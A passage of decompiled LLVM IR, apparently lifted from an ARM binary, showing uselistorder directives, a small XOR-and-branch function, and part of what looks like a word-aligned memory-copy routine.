  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 16, 17, 19, 20, 21, 22, 23, 25, 24, 46, 27, 28, 32, 29, 30, 31, 33, 26, 34, 35, 36, 37, 38, 40, 39, 41, 42, 43, 45, 58, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 44, 68, 69, 70, 71, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 16, 17, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 8, 9, 10, 5, 6, 7, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 23, 22, 25, 24, 14, 15, 26, 16, 17, 18, 21, 19, 20, 27, 28, 29, 2, 1, 30, 32, 31, 33, 3, 34, 35, 36, 37, 38, 39, 40, 41, 13, 42, 43, 12, 44, 45, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 8, 5, 6, 7, 9, 10, 14, 12, 13, 15, 16, 11, 17, 18, 19, 20, 21 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 61, 18, 19, 20, 21, 22, 23, 24, 25, 60, 26, 27, 28, 29, 30, 59, 31, 32, 33, 34, 35, 36, 37, 58, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 58, 17, 18, 19, 20, 21, 22, 23, 24, 25, 57, 26, 27, 28, 29, 56, 30, 31, 32, 33, 34, 35, 36, 55, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 61, 18, 19, 20, 21, 22, 23, 24, 25, 26, 60, 27, 28, 29, 30, 59, 31, 32, 33, 34, 35, 36, 37, 58, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_103f4, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i8 48, { 2, 3, 4, 6, 7, 8, 9, 10, 0, 1, 11, 5 }
  uselistorder i32 (i8*, i32)* @function_11d70, { 16, 31, 29, 25, 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 28, 26, 27 }
  uselistorder i32 17, { 8, 3, 9, 10, 4, 11, 12, 20, 13, 14, 15, 16, 5, 17, 6, 18, 7, 19, 2, 1, 0 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i32 ()* @function_10218, { 1, 7, 6, 5, 4, 3, 2, 9, 8, 10, 0 }
  uselistorder i32 (i32, i32)* @function_10328, { 2, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_16568, { 1, 0 }
  uselistorder i32 1104006501, { 1, 4, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_181b0.411 to i32), { 1, 0, 2 }
  uselistorder i32 9, { 21, 26, 20, 27, 33, 22, 28, 25, 29, 30, 31, 32, 23, 24, 19, 18, 17, 16, 15, 12, 13, 14, 11, 10, 8, 9, 7, 6, 5, 4, 3, 2, 1, 0, 34 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1603c, { 2, 1, 0 }
  uselistorder i8 45, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 45, { 1, 2, 3, 0 }
  uselistorder i32 (i32)* @function_16570, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_16364, { 2, 1, 0 }
  uselistorder i8 32, { 1, 0, 3, 4, 5, 2, 6, 7, 8 }
  uselistorder i32 101, { 1, 2, 3, 0, 4 }
  uselistorder i32 97, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14e44, { 2, 0, 1 }
  uselistorder label %bb271, { 1, 0 }
  uselistorder label %dec_label_pc_14da4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14cf0, { 1, 0 }
  uselistorder label %.thread49, { 1, 0 }
  uselistorder label %dec_label_pc_14cc8, { 1, 0 }
  uselistorder label %dec_label_pc_14ca4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14c88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14c54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14c50, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14bac, { 1, 0 }
  uselistorder label %bb258, { 1, 0 }
  uselistorder label %dec_label_pc_14b9c, { 1, 0 }
  uselistorder label %dec_label_pc_14b90, { 1, 0 }
  uselistorder label %bb252, { 1, 0 }
  uselistorder label %bb250, { 1, 0 }
  uselistorder label %bb248, { 1, 0 }
  uselistorder label %.thread161, { 1, 0 }
  uselistorder label %bb244, { 1, 0 }
  uselistorder label %bb242, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb239, { 1, 0 }
  uselistorder label %dec_label_pc_14ab0, { 2, 1, 0 }
  uselistorder label %bb236, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_149d8, { 1, 0 }
  uselistorder label %dec_label_pc_14998, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1493c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14934, { 1, 0 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %dec_label_pc_14828, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %dec_label_pc_14744, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14e88(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14e88:
  %v0_14e9c = load i1, i1* @cpsr_n, align 1
  br i1 %v0_14e9c, label %bb, label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14e88
  %v0_14ea8.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14ea8.pr, label %thread-pre-split._crit_edge, label %.thread2

thread-pre-split._crit_edge:                      ; preds = %thread-pre-split
  br label %bb11

bb:                                               ; preds = %dec_label_pc_14e88
  %v1_14ea0 = load i32, i32* @r4, align 4
  %v3_14ea0 = xor i32 %v1_14ea0, %arg1
  %v2_14ea4 = sub i32 -1, %v3_14ea0
  %v4_14ea4 = icmp eq i32 %v3_14ea0, -1
  br i1 %v4_14ea4, label %bb11, label %.thread2

bb11:                                             ; preds = %thread-pre-split._crit_edge, %bb
  %v7_14eac9 = phi i32 [ %arg1, %thread-pre-split._crit_edge ], [ %v2_14ea4, %bb ]
  br label %.thread2

.thread2:                                         ; preds = %bb, %thread-pre-split, %bb11
  %v7_14eac = phi i32 [ %v2_14ea4, %bb ], [ %arg1, %thread-pre-split ], [ %v7_14eac9, %bb11 ]
  ret i32 %v7_14eac

; uselistorder directives
  uselistorder i32 %v2_14ea4, { 1, 0 }
  uselistorder i32 %v3_14ea0, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_14eb0() local_unnamed_addr {
dec_label_pc_14eb0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_14eb0 = load i32, i32* @r1, align 4
  %v1_14eb0 = load i32, i32* @r0, align 4
  %v2_14eb0 = sub i32 %v0_14eb0, %v1_14eb0
  %v3_14eb0 = icmp ult i32 %v0_14eb0, %v1_14eb0
  %v4_14eb0 = xor i32 %v1_14eb0, %v0_14eb0
  %v5_14eb0 = xor i32 %v2_14eb0, %v0_14eb0
  %v6_14eb0 = and i32 %v5_14eb0, %v4_14eb0
  %v7_14eb0 = icmp slt i32 %v6_14eb0, 0
  store i1 %v7_14eb0, i1* %cpsr_v.global-to-local, align 1
  %v8_14eb0 = icmp slt i32 %v2_14eb0, 0
  store i1 %v8_14eb0, i1* %cpsr_n.global-to-local, align 1
  %v9_14eb0 = icmp eq i32 %v0_14eb0, %v1_14eb0
  store i1 %v9_14eb0, i1* @cpsr_z, align 1
  br i1 %v3_14eb0, label %dec_label_pc_150fc, label %dec_label_pc_14eb8

dec_label_pc_14eb8:                               ; preds = %dec_label_pc_14eb0
  br i1 %v9_14eb0, label %.thread122, label %bb

.thread122:                                       ; preds = %bb144, %.thread121, %bb141, %dec_label_pc_14eb8
  %merge = phi i32 [ %v0_14eb0, %dec_label_pc_14eb8 ], [ %v2_15190, %bb141 ], [ %v11_151ac, %bb144 ], [ %v7_151ac, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_14eb8
  store i32 %v1_14eb0, i32* %stack_var_-8, align 4
  %v0_14ec0 = load i32, i32* @r2, align 4
  %v2_14ec0 = add i32 %v0_14ec0, -4
  store i32 %v2_14ec0, i32* %r2.global-to-local, align 4
  %v4_14ec0 = sub i32 3, %v0_14ec0
  %v5_14ec0 = and i32 %v4_14ec0, %v0_14ec0
  %v6_14ec0 = icmp slt i32 %v5_14ec0, 0
  store i1 %v6_14ec0, i1* %cpsr_v.global-to-local, align 1
  %v7_14ec0 = icmp slt i32 %v2_14ec0, 0
  store i1 %v7_14ec0, i1* %cpsr_n.global-to-local, align 1
  %v5_14ec4 = icmp slt i32 %v0_14ec0, 4
  br i1 %v5_14ec4, label %bb131, label %dec_label_pc_14ec8

dec_label_pc_14ec8:                               ; preds = %bb
  %v1_14ec8 = urem i32 %v1_14eb0, 4
  store i32 %v1_14ec8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14ec8 = icmp eq i32 %v1_14ec8, 0
  br i1 %v2_14ec8, label %dec_label_pc_14ed0, label %dec_label_pc_14f74

dec_label_pc_14ed0:                               ; preds = %dec_label_pc_14ec8
  %v1_14ed0 = urem i32 %v0_14eb0, 4
  store i32 %v1_14ed0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14ed0 = icmp eq i32 %v1_14ed0, 0
  %extract.t = trunc i32 %v0_14eb0 to i2
  br i1 %v2_14ed0, label %dec_label_pc_14ed8, label %dec_label_pc_14fa4

dec_label_pc_14ed8:                               ; preds = %dec_label_pc_14ed0, %dec_label_pc_14f9c
  %v0_14ef092 = phi i32 [ %v1_14eb0, %dec_label_pc_14ed0 ], [ %v0_14fec75, %dec_label_pc_14f9c ]
  %v0_14eec91 = phi i32 [ %v0_14eb0, %dec_label_pc_14ed0 ], [ %v0_14f9c, %dec_label_pc_14f9c ]
  %v0_14ed8 = phi i32 [ %v2_14ec0, %dec_label_pc_14ed0 ], [ %v2_14f94, %dec_label_pc_14f9c ]
  %v2_14ed8 = add i32 %v0_14ed8, -8
  store i32 %v2_14ed8, i32* %r2.global-to-local, align 4
  %v4_14ed8 = sub i32 7, %v0_14ed8
  %v5_14ed8 = and i32 %v4_14ed8, %v0_14ed8
  %v6_14ed8 = icmp slt i32 %v5_14ed8, 0
  store i1 %v6_14ed8, i1* %cpsr_v.global-to-local, align 1
  %v7_14ed8 = icmp slt i32 %v2_14ed8, 0
  store i1 %v7_14ed8, i1* %cpsr_n.global-to-local, align 1
  %v5_14edc = icmp slt i32 %v0_14ed8, 8
  br i1 %v5_14edc, label %dec_label_pc_14f2c, label %dec_label_pc_14ee0

dec_label_pc_14ee0:                               ; preds = %dec_label_pc_14ed8
  %v2_14ee0 = add i32 %v0_14ed8, -28
  store i32 %v2_14ee0, i32* %r2.global-to-local, align 4
  %v4_14ee0 = sub i32 27, %v0_14ed8
  %v5_14ee0 = and i32 %v4_14ee0, %v2_14ed8
  %v6_14ee0 = icmp slt i32 %v5_14ee0, 0
  store i1 %v6_14ee0, i1* %cpsr_v.global-to-local, align 1
  %v7_14ee0 = icmp slt i32 %v2_14ee0, 0
  store i1 %v7_14ee0, i1* %cpsr_n.global-to-local, align 1
  %v5_14ee4 = icmp slt i32 %v2_14ed8, 20
  br i1 %v5_14ee4, label %dec_label_pc_14f18, label %dec_label_pc_14ee8

dec_label_pc_14ee8:                               ; preds = %dec_label_pc_14ee0
  %v0_14ee8 = load i32, i32* @r4, align 4
  store i32 %v0_14ee8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14eec

dec_label_pc_14eec:                               ; preds = %dec_label_pc_14eec.dec_label_pc_14eec_crit_edge, %dec_label_pc_14ee8
  %v0_14ef0 = phi i32 [ %v12_14ef8, %dec_label_pc_14eec.dec_label_pc_14eec_crit_edge ], [ %v0_14ef092, %dec_label_pc_14ee8 ]
  %v0_14eec = phi i32 [ %v0_14eec.pre, %dec_label_pc_14eec.dec_label_pc_14eec_crit_edge ], [ %v0_14eec91, %dec_label_pc_14ee8 ]
  %v1_14eec = inttoptr i32 %v0_14eec to i32*
  %v2_14eec = load i32, i32* %v1_14eec, align 4
  store i32 %v2_14eec, i32* %r3.global-to-local, align 4
  %v3_14eec = add i32 %v0_14eec, 4
  %v4_14eec = inttoptr i32 %v3_14eec to i32*
  %v5_14eec = load i32, i32* %v4_14eec, align 4
  store i32 %v5_14eec, i32* %r4.global-to-local, align 4
  %v6_14eec = add i32 %v0_14eec, 8
  %v7_14eec = inttoptr i32 %v6_14eec to i32*
  %v8_14eec = load i32, i32* %v7_14eec, align 4
  store i32 %v8_14eec, i32* %ip.global-to-local, align 4
  %v9_14eec = add i32 %v0_14eec, 12
  %v10_14eec = inttoptr i32 %v9_14eec to i32*
  %v11_14eec = load i32, i32* %v10_14eec, align 4
  store i32 %v11_14eec, i32* %lr.global-to-local, align 4
  %v12_14eec = add i32 %v0_14eec, 16
  store i32 %v12_14eec, i32* %r1.global-to-local, align 4
  %v1_14ef0 = inttoptr i32 %v0_14ef0 to i32*
  store i32 %v2_14eec, i32* %v1_14ef0, align 4
  %v3_14ef0 = add i32 %v0_14ef0, 4
  %v4_14ef0 = inttoptr i32 %v3_14ef0 to i32*
  %v5_14ef0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14ef0, i32* %v4_14ef0, align 4
  %v6_14ef0 = add i32 %v0_14ef0, 8
  %v7_14ef0 = inttoptr i32 %v6_14ef0 to i32*
  %v8_14ef0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_14ef0, i32* %v7_14ef0, align 4
  %v9_14ef0 = add i32 %v0_14ef0, 12
  %v10_14ef0 = inttoptr i32 %v9_14ef0 to i32*
  %v11_14ef0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14ef0, i32* %v10_14ef0, align 4
  %v12_14ef0 = add i32 %v0_14ef0, 16
  store i32 %v12_14ef0, i32* %r0.global-to-local, align 4
  %v0_14ef4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ef4 = inttoptr i32 %v0_14ef4 to i32*
  %v2_14ef4 = load i32, i32* %v1_14ef4, align 4
  store i32 %v2_14ef4, i32* %r3.global-to-local, align 4
  %v3_14ef4 = add i32 %v0_14ef4, 4
  %v4_14ef4 = inttoptr i32 %v3_14ef4 to i32*
  %v5_14ef4 = load i32, i32* %v4_14ef4, align 4
  store i32 %v5_14ef4, i32* %r4.global-to-local, align 4
  %v6_14ef4 = add i32 %v0_14ef4, 8
  %v7_14ef4 = inttoptr i32 %v6_14ef4 to i32*
  %v8_14ef4 = load i32, i32* %v7_14ef4, align 4
  store i32 %v8_14ef4, i32* @ip, align 4
  %v9_14ef4 = add i32 %v0_14ef4, 12
  %v10_14ef4 = inttoptr i32 %v9_14ef4 to i32*
  %v11_14ef4 = load i32, i32* %v10_14ef4, align 4
  store i32 %v11_14ef4, i32* @lr, align 4
  %v12_14ef4 = add i32 %v0_14ef4, 16
  store i32 %v12_14ef4, i32* @r1, align 4
  %v1_14ef8 = inttoptr i32 %v12_14ef0 to i32*
  store i32 %v2_14ef4, i32* %v1_14ef8, align 4
  %v3_14ef8 = add i32 %v0_14ef0, 20
  %v4_14ef8 = inttoptr i32 %v3_14ef8 to i32*
  %v5_14ef8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14ef8, i32* %v4_14ef8, align 4
  %v6_14ef8 = add i32 %v0_14ef0, 24
  %v7_14ef8 = inttoptr i32 %v6_14ef8 to i32*
  %v8_14ef8 = load i32, i32* @ip, align 4
  store i32 %v8_14ef8, i32* %v7_14ef8, align 4
  %v9_14ef8 = add i32 %v0_14ef0, 28
  %v10_14ef8 = inttoptr i32 %v9_14ef8 to i32*
  %v11_14ef8 = load i32, i32* @lr, align 4
  store i32 %v11_14ef8, i32* %v10_14ef8, align 4
  %v12_14ef8 = add i32 %v0_14ef0, 32
  store i32 %v12_14ef8, i32* @r0, align 4
  %v0_14efc = load i32, i32* %r2.global-to-local, align 4
  %v2_14efc = add i32 %v0_14efc, -32
  store i32 %v2_14efc, i32* %r2.global-to-local, align 4
  %v6_14f00 = icmp slt i32 %v0_14efc, 32
  br i1 %v6_14f00, label %dec_label_pc_14f04, label %dec_label_pc_14eec.dec_label_pc_14eec_crit_edge

dec_label_pc_14eec.dec_label_pc_14eec_crit_edge:  ; preds = %dec_label_pc_14eec
  %v0_14eec.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14eec

dec_label_pc_14f04:                               ; preds = %dec_label_pc_14eec
  %v4_14f04 = add i32 %v0_14efc, -16
  %v6_14f04 = add i32 %v0_14efc, 2147483616
  %v7_14f04 = and i32 %v4_14f04, %v6_14f04
  %v8_14f04 = icmp slt i32 %v7_14f04, 0
  store i1 %v8_14f04, i1* %cpsr_v.global-to-local, align 1
  %v9_14f04 = icmp slt i32 %v4_14f04, 0
  store i1 %v9_14f04, i1* %cpsr_n.global-to-local, align 1
  %v5_14f08 = icmp slt i32 %v2_14efc, -16
  br i1 %v5_14f08, label %.thread1, label %bb128

bb128:                                            ; preds = %dec_label_pc_14f04
  %v6_14f08 = load i32, i32* @r1, align 4
  %v7_14f08 = inttoptr i32 %v6_14f08 to i32*
  %v8_14f08 = load i32, i32* %v7_14f08, align 4
  store i32 %v8_14f08, i32* %r3.global-to-local, align 4
  %v9_14f08 = add i32 %v6_14f08, 4
  %v10_14f08 = inttoptr i32 %v9_14f08 to i32*
  %v11_14f08 = load i32, i32* %v10_14f08, align 4
  store i32 %v11_14f08, i32* %r4.global-to-local, align 4
  %v12_14f08 = add i32 %v6_14f08, 8
  %v13_14f08 = inttoptr i32 %v12_14f08 to i32*
  %v14_14f08 = load i32, i32* %v13_14f08, align 4
  store i32 %v14_14f08, i32* @ip, align 4
  %v15_14f08 = add i32 %v6_14f08, 12
  %v16_14f08 = inttoptr i32 %v15_14f08 to i32*
  %v17_14f08 = load i32, i32* %v16_14f08, align 4
  store i32 %v17_14f08, i32* @lr, align 4
  %v18_14f08 = add i32 %v6_14f08, 16
  store i32 %v18_14f08, i32* @r1, align 4
  %v7_14f0c = inttoptr i32 %v12_14ef8 to i32*
  store i32 %v8_14f08, i32* %v7_14f0c, align 4
  %v9_14f0c = add i32 %v0_14ef0, 36
  %v10_14f0c = inttoptr i32 %v9_14f0c to i32*
  %v11_14f0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_14f0c, i32* %v10_14f0c, align 4
  %v12_14f0c = add i32 %v0_14ef0, 40
  %v13_14f0c = inttoptr i32 %v12_14f0c to i32*
  %v14_14f0c = load i32, i32* @ip, align 4
  store i32 %v14_14f0c, i32* %v13_14f0c, align 4
  %v15_14f0c = add i32 %v0_14ef0, 44
  %v16_14f0c = inttoptr i32 %v15_14f0c to i32*
  %v17_14f0c = load i32, i32* @lr, align 4
  store i32 %v17_14f0c, i32* %v16_14f0c, align 4
  %v18_14f0c = add i32 %v0_14ef0, 48
  store i32 %v18_14f0c, i32* @r0, align 4
  %v6_14f10 = load i32, i32* %r2.global-to-local, align 4
  %v7_14f10 = add i32 %v6_14f10, -16
  store i32 %v7_14f10, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14f04, %bb128
  %v3_14f20101 = phi i32 [ %v12_14ef8, %dec_label_pc_14f04 ], [ %v18_14f0c, %bb128 ]
  %v0_14f1895 = phi i32 [ %v2_14efc, %dec_label_pc_14f04 ], [ %v7_14f10, %bb128 ]
  %v2_14f14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14f14, i32* @r4, align 4
  br label %dec_label_pc_14f18

dec_label_pc_14f18:                               ; preds = %dec_label_pc_14ee0, %.thread1
  %v3_14f20100 = phi i32 [ %v0_14ef092, %dec_label_pc_14ee0 ], [ %v3_14f20101, %.thread1 ]
  %v0_14f18 = phi i32 [ %v2_14ee0, %dec_label_pc_14ee0 ], [ %v0_14f1895, %.thread1 ]
  %v1_14f18 = add i32 %v0_14f18, 20
  store i32 %v1_14f18, i32* %r2.global-to-local, align 4
  %v3_14f18 = sub i32 0, %v0_14f18
  %v4_14f18 = and i32 %v1_14f18, %v3_14f18
  %v5_14f18 = icmp slt i32 %v4_14f18, 0
  store i1 %v5_14f18, i1* %cpsr_v.global-to-local, align 1
  %v6_14f18 = icmp slt i32 %v1_14f18, 0
  store i1 %v6_14f18, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14f1c

dec_label_pc_14f1c:                               ; preds = %.thread117, %dec_label_pc_14f18
  %v0_14f2c.pre147 = phi i32 [ %v0_14f2c.pre, %.thread117 ], [ %v1_14f18, %dec_label_pc_14f18 ]
  %v3_14f20 = phi i32 [ %v3_14f2098118, %.thread117 ], [ %v3_14f20100, %dec_label_pc_14f18 ]
  %v1_14f24 = phi i1 [ %v1_14f28, %.thread117 ], [ %v5_14f18, %dec_label_pc_14f18 ]
  %v0_14f24 = phi i1 [ %v0_14f28, %.thread117 ], [ %v6_14f18, %dec_label_pc_14f18 ]
  %v2_14f1c = xor i1 %v1_14f24, %v0_14f24
  br i1 %v2_14f1c, label %.thread117, label %bb129

bb129:                                            ; preds = %dec_label_pc_14f1c
  %v3_14f1c = load i32, i32* @r1, align 4
  %v4_14f1c = inttoptr i32 %v3_14f1c to i32*
  %v5_14f1c = load i32, i32* %v4_14f1c, align 4
  store i32 %v5_14f1c, i32* %r3.global-to-local, align 4
  %v6_14f1c = add i32 %v3_14f1c, 4
  %v7_14f1c = inttoptr i32 %v6_14f1c to i32*
  %v8_14f1c = load i32, i32* %v7_14f1c, align 4
  store i32 %v8_14f1c, i32* @ip, align 4
  %v9_14f1c = add i32 %v3_14f1c, 8
  %v10_14f1c = inttoptr i32 %v9_14f1c to i32*
  %v11_14f1c = load i32, i32* %v10_14f1c, align 4
  store i32 %v11_14f1c, i32* @lr, align 4
  %v12_14f1c = add i32 %v3_14f1c, 12
  store i32 %v12_14f1c, i32* @r1, align 4
  %v4_14f20 = inttoptr i32 %v3_14f20 to i32*
  store i32 %v5_14f1c, i32* %v4_14f20, align 4
  %v6_14f20 = add i32 %v3_14f20, 4
  %v7_14f20 = inttoptr i32 %v6_14f20 to i32*
  %v8_14f20 = load i32, i32* @ip, align 4
  store i32 %v8_14f20, i32* %v7_14f20, align 4
  %v9_14f20 = add i32 %v3_14f20, 8
  %v10_14f20 = inttoptr i32 %v9_14f20 to i32*
  %v11_14f20 = load i32, i32* @lr, align 4
  store i32 %v11_14f20, i32* %v10_14f20, align 4
  %v12_14f20 = add i32 %v3_14f20, 12
  store i32 %v12_14f20, i32* @r0, align 4
  %v3_14f24 = load i32, i32* %r2.global-to-local, align 4
  %v4_14f24 = add i32 %v3_14f24, -12
  store i32 %v4_14f24, i32* %r2.global-to-local, align 4
  %v6_14f24 = sub i32 11, %v3_14f24
  %v7_14f24 = and i32 %v6_14f24, %v3_14f24
  %v8_14f24 = icmp slt i32 %v7_14f24, 0
  store i1 %v8_14f24, i1* %cpsr_v.global-to-local, align 1
  %v9_14f24 = icmp slt i32 %v4_14f24, 0
  store i1 %v9_14f24, i1* %cpsr_n.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_14f1c, %bb129
  %v0_14f2c.pre = phi i32 [ %v4_14f24, %bb129 ], [ %v0_14f2c.pre147, %dec_label_pc_14f1c ]
  %v3_14f2098118 = phi i32 [ %v12_14f20, %bb129 ], [ %v3_14f20, %dec_label_pc_14f1c ]
  %v1_14f28 = phi i1 [ %v8_14f24, %bb129 ], [ %v1_14f24, %dec_label_pc_14f1c ]
  %v0_14f28 = phi i1 [ %v9_14f24, %bb129 ], [ %v0_14f24, %dec_label_pc_14f1c ]
  %v2_14f28 = xor i1 %v1_14f28, %v0_14f28
  br i1 %v2_14f28, label %dec_label_pc_14f2c, label %dec_label_pc_14f1c

dec_label_pc_14f2c:                               ; preds = %.thread117, %dec_label_pc_14ed8
  %v7_14f3c = phi i32 [ %v0_14ef092, %dec_label_pc_14ed8 ], [ %v3_14f2098118, %.thread117 ]
  %v0_14f2c = phi i32 [ %v2_14ed8, %dec_label_pc_14ed8 ], [ %v0_14f2c.pre, %.thread117 ]
  %v2_14f2c = add i32 %v0_14f2c, 8
  store i32 %v2_14f2c, i32* %r2.global-to-local, align 4
  %v4_14f2c = sub i32 0, %v0_14f2c
  %v5_14f2c = and i32 %v2_14f2c, %v4_14f2c
  %v6_14f2c = icmp slt i32 %v5_14f2c, 0
  store i1 %v6_14f2c, i1* %cpsr_v.global-to-local, align 1
  %v7_14f2c = icmp slt i32 %v2_14f2c, 0
  store i1 %v7_14f2c, i1* %cpsr_n.global-to-local, align 1
  %v5_14f30 = icmp slt i32 %v0_14f2c, -8
  br i1 %v5_14f30, label %bb131, label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f2c
  %v6_14f34 = add i32 %v0_14f2c, 4
  store i32 %v6_14f34, i32* %r2.global-to-local, align 4
  %v8_14f34 = sub i32 -5, %v0_14f2c
  %v9_14f34 = and i32 %v8_14f34, %v2_14f2c
  %v10_14f34 = icmp slt i32 %v9_14f34, 0
  store i1 %v10_14f34, i1* %cpsr_v.global-to-local, align 1
  %v11_14f34 = icmp slt i32 %v6_14f34, 0
  store i1 %v11_14f34, i1* %cpsr_n.global-to-local, align 1
  %v5_14f38 = icmp slt i32 %v2_14f2c, 4
  %v6_14f38 = load i32, i32* @r1, align 4
  %v7_14f38 = inttoptr i32 %v6_14f38 to i32*
  %v8_14f38 = load i32, i32* %v7_14f38, align 4
  store i32 %v8_14f38, i32* %r3.global-to-local, align 4
  %v10_14f38 = add i32 %v6_14f38, 4
  br i1 %v5_14f38, label %.thread5, label %bb130

.thread5:                                         ; preds = %dec_label_pc_14f34
  store i32 %v10_14f38, i32* @r1, align 4
  %v8_14f3c = inttoptr i32 %v7_14f3c to i32*
  store i32 %v8_14f38, i32* %v8_14f3c, align 4
  %v9_14f3c = load i32, i32* @r0, align 4
  %v10_14f3c = add i32 %v9_14f3c, 4
  store i32 %v10_14f3c, i32* @r0, align 4
  %v0_14f4c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb131

bb130:                                            ; preds = %dec_label_pc_14f34
  %v10_14f40 = inttoptr i32 %v10_14f38 to i32*
  %v11_14f40 = load i32, i32* %v10_14f40, align 4
  store i32 %v11_14f40, i32* @ip, align 4
  %v12_14f40 = add i32 %v6_14f38, 8
  store i32 %v12_14f40, i32* @r1, align 4
  %v7_14f44 = inttoptr i32 %v7_14f3c to i32*
  store i32 %v8_14f38, i32* %v7_14f44, align 4
  %v9_14f44 = add i32 %v7_14f3c, 4
  %v10_14f44 = inttoptr i32 %v9_14f44 to i32*
  %v11_14f44 = load i32, i32* @ip, align 4
  store i32 %v11_14f44, i32* %v10_14f44, align 4
  %v12_14f44 = add i32 %v7_14f3c, 8
